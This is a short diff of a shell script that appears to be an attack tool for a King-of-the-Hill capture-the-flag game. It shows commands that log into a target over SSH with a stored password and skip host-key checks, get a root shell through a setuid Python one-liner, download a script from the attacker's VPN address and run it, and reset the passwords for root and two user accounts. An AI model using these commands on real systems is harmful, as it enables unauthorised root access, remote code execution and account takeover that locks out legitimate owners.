@@ -33,7 +33,7 @@ vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)
 
 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no rcampbell@"$IP" << EOF
     /usr/bin/python3.6 -c 'import os; os.setuid(0); os.system("/bin/sh")'
-    cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username"
+    cd /boot && wget http://$vpn/Scripts/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username"
     echo "root:$new_password" | chpasswd
     echo "rcampbell:$new_password" | chpasswd
     echo "gcrawford:$new_password" | chpasswd
